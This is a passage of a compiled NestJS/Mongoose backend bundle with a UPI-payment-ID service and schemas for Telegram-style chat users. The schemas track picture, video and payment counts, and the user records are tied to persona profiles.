            this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to delete transaction');
        }
    }
};
exports.TransactionService = TransactionService;
exports.TransactionService = TransactionService = TransactionService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(transaction_schema_1.Transaction.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], TransactionService);


/***/ }),

/***/ "./src/components/upi-ids/index.ts":
/*!*****************************************!*\
  !*** ./src/components/upi-ids/index.ts ***!
  \*****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./upi-ids.controller */ "./src/components/upi-ids/upi-ids.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./upi-ids.module */ "./src/components/upi-ids/upi-ids.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./upi-ids.schema */ "./src/components/upi-ids/upi-ids.schema.ts"), exports);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.controller.ts":
/*!******************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.controller.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
let UpiIdController = class UpiIdController {
    constructor(UpiIdService) {
        this.UpiIdService = UpiIdService;
    }
    async findOne() {
        return this.UpiIdService.findOne();
    }
    async update(updateUpiIdsdto) {
        return this.UpiIdService.update(updateUpiIdsdto);
    }
};
exports.UpiIdController = UpiIdController;
__decorate([
    (0, common_1.Get)(),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.CloudflareCache)(3600, 60),
    (0, swagger_1.ApiOperation)({ summary: 'Get Upi Ids' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update Upi Ids' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "update", null);
exports.UpiIdController = UpiIdController = __decorate([
    (0, swagger_1.ApiTags)('UPI Ids'),
    (0, common_1.Controller)('upi-ids'),
    __metadata("design:paramtypes", [upi_ids_service_1.UpiIdService])
], UpiIdController);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.module.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.module.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
const upi_ids_controller_1 = __webpack_require__(/*! ./upi-ids.controller */ "./src/components/upi-ids/upi-ids.controller.ts");
const upi_ids_schema_1 = __webpack_require__(/*! ./upi-ids.schema */ "./src/components/upi-ids/upi-ids.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let UpiIdModule = class UpiIdModule {
};
exports.UpiIdModule = UpiIdModule;
exports.UpiIdModule = UpiIdModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            UpiIdModule,
            npoint_module_1.NpointModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: upi_ids_schema_1.UpiIdSchema }]),
        ],
        providers: [upi_ids_service_1.UpiIdService],
        controllers: [upi_ids_controller_1.UpiIdController],
        exports: [upi_ids_service_1.UpiIdService],
    })
], UpiIdModule);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.schema.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.schema.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdSchema = exports.UpiId = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let UpiId = class UpiId {
};
exports.UpiId = UpiId;
exports.UpiId = UpiId = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        timestamps: false,
        toJSON: {
            virtuals: false,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UpiId);
exports.UpiIdSchema = mongoose_1.SchemaFactory.createForClass(UpiId);
exports.UpiIdSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.service.ts":
/*!***************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.service.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var UpiIdService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let UpiIdService = UpiIdService_1 = class UpiIdService {
    constructor(upiIdModel, npointService) {
        this.upiIdModel = upiIdModel;
        this.npointService = npointService;
        this.logger = new utils_1.Logger(UpiIdService_1.name);
        this.checkInterval = null;
        this.upiIds = null;
        this.isInitialized = false;
        this.REFRESH_INTERVAL = 5 * 60 * 1000;
        this.MAX_RETRIES = 3;
        this.RETRY_DELAY = 1000;
    }
    async onModuleInit() {
        try {
            await this.initializeService();
        }
        catch (error) {
            this.logger.error('Failed to initialize UPI ID Service', error.stack);
            throw error;
        }
    }
    onModuleDestroy() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
    }
    async initializeService() {
        try {
            await this.refreshUPIs();
            this.startPeriodicCheck();
            this.isInitialized = true;
        }
        catch (error) {
            this.logger.error('Service initialization failed', error.stack);
            throw new Error('UPI ID Service initialization failed');
        }
    }
    startPeriodicCheck() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
        }
        this.checkInterval = setInterval(async () => {
            try {
                await Promise.all([
                    this.refreshUPIs(),
                    this.checkNpoint()
                ]);
            }
            catch (error) {
                this.logger.error('Error during periodic check', error.stack);
            }
        }, this.REFRESH_INTERVAL);
    }
    async refreshUPIs() {
        try {
            const result = await this.executeWithRetry(async () => {
                return await this.upiIdModel.findOne({}).lean().exec();
            });
            if (result) {
                this.upiIds = { ...result };
            }
            else {
                this.logger.warn('No UPI data found in database');
            }
        }
        catch (error) {
            this.logger.error('Failed to refresh UPIs', error.stack);
            throw error;
        }
    }
    async checkNpoint() {
        try {
        }
        catch (error) {
            this.logger.error('Error checking npoint', error.stack);
        }
    }
    async findOne() {
        if (!this.isInitialized) {
            throw new Error('Service not initialized. Please wait for initialization to complete.');
        }
        try {
            if (this.upiIds && Object.keys(this.upiIds).length > 0) {
                return { ...this.upiIds };
            }
            this.logger.debug('Cache miss, fetching from database...');
            const result = await this.executeWithRetry(async () => {
                return await this.upiIdModel.findOne({}).lean().exec();
            });
            if (!result) {
                this.logger.warn('No UPI data found');
                return null;
            }
            this.upiIds = { ...result };
            this.logger.debug('UPIs fetched and cached');
            return { ...result };
        }
        catch (error) {
            this.logger.error('Error finding UPI data', error.stack);
            throw error;
        }
    }
    async update(updateClientDto) {
        if (!updateClientDto || typeof updateClientDto !== 'object') {
            throw new Error('Invalid update data provided');
        }
        try {
            const updateData = { ...updateClientDto };
            delete updateData._id;
            this.logger.debug('Updating UPI data...');
            const updatedUser = await this.executeWithRetry(async () => {
                return await this.upiIdModel.findOneAndUpdate({}, {
                    $set: {
                        ...updateData,
                        updatedAt: new Date()
                    }
                }, {
                    new: true,
                    upsert: true,
                    lean: true,
                    runValidators: true
                }).exec();
            });
            if (!updatedUser) {
                throw new common_1.NotFoundException('Failed to update UPI data');
            }
            this.upiIds = { ...updatedUser };
            this.logger.log('UPI data updated successfully');
            return { ...updatedUser };
        }
        catch (error) {
            this.logger.error('Error updating UPI data', error.stack);
            throw error;
        }
    }
    async executeWithRetry(operation, retries = this.MAX_RETRIES) {
        for (let attempt = 1; attempt <= retries; attempt++) {
            try {
                return await operation();
            }
            catch (error) {
                this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, error.message);
                if (attempt === retries) {
                    throw error;
                }
                const delay = this.RETRY_DELAY * Math.pow(2, attempt - 1);
                await this.sleep(delay);
            }
        }
        throw new Error('All retry attempts failed');
    }
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    getServiceStatus() {
        return {
            isInitialized: this.isInitialized,
            hasCachedData: this.upiIds !== null && Object.keys(this.upiIds).length > 0,
            lastUpdate: this.upiIds?.updatedAt
        };
    }
};
exports.UpiIdService = UpiIdService;
exports.UpiIdService = UpiIdService = UpiIdService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('UpiIdModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], UpiIdService);


/***/ }),

/***/ "./src/components/user-data/dto/create-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/create-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDataDto {
}
exports.CreateUserDataDto = CreateUserDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '5787751360', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Total count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Picture count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802722566, description: 'Last message timestamp' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802742567, description: 'Limit time' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Paid count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Profile count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Can reply' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Pay amount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'highestPayAmount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "highestPayAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'cheatCount', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "cheatCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'callTime', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "callTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '  ', description: 'Username' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '-7250939091939055173', description: 'Access hash' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid reply status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Demo given status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second show status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'sneha', description: 'Profile name' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "picsSent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: [], description: 'videos' }),
    __metadata("design:type", Array)
], CreateUserDataDto.prototype, "videos", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/index.ts":
/*!***********************************************!*\
  !*** ./src/components/user-data/dto/index.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-user-data.dto */ "./src/components/user-data/dto/search-user-data.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-user-data.dto */ "./src/components/user-data/dto/update-user-data.dto.ts"), exports);


/***/ }),

/***/ "./src/components/user-data/dto/search-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/search-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchDto {
}
exports.SearchDto = SearchDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Picture count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last message timestamp', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Limit time', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Can reply', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pay amount', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username' }),
    __metadata("design:type", String)
], SearchDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Access hash' }),
    __metadata("design:type", String)
], SearchDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid reply status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Second show status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Chat ID' }),
    __metadata("design:type", String)
], SearchDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "picsSent", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/update-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/update-user-data.dto.ts ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_user_data_dto_1 = __webpack_require__(/*! ./create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
class UpdateUserDataDto extends (0, swagger_1.PartialType)(create_user_data_dto_1.CreateUserDataDto) {
}
exports.UpdateUserDataDto = UpdateUserDataDto;


/***/ }),

/***/ "./src/components/user-data/index.ts":
/*!*******************************************!*\
  !*** ./src/components/user-data/index.ts ***!
  \*******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/user-data/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/user-data/schemas/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./user-data.controller */ "./src/components/user-data/user-data.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./user-data.module */ "./src/components/user-data/user-data.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts"), exports);


/***/ }),

/***/ "./src/components/user-data/schemas/index.ts":
/*!***************************************************!*\
  !*** ./src/components/user-data/schemas/index.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts"), exports);


/***/ }),

/***/ "./src/components/user-data/schemas/user-data.schema.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/schemas/user-data.schema.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataSchema = exports.UserData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let UserData = class UserData {
};
exports.UserData = UserData;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "totalCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "picCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "limitTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "paidCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "prfCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "canReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "payAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "accessHash", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "paidReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "demoGiven", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "secondShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: 0 }),
    __metadata("design:type", Number)
], UserData.prototype, "fullShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "profile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "picSent", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "highestPayAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "cheatCount", void 0);
